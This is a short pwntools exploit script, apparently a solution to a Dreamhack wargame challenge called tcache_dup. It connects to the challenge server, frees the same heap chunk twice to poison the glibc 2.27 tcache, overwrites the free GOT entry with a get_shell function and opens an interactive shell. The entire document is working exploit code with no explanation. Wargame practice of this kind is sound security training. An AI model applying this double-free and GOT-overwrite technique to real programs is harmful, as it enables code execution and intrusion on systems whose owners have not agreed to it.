#!/usr/bin/env python3
from pwn import *
import sys


#p = process('./tcache_dup')
p = remote('host3.dreamhack.games', 20487)
e = ELF('./tcache_dup')
libc = ELF('./libc-2.27.so')

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())
create(0x10, b'aaaaaaaa')
delete(0)
delete(0)
create(0x10, p64(e.got['free']))
create(0x10, b'bbbbbbbb')
create(0x10, p64(e.symbols['get_shell']))
delete(0)
p.interactive()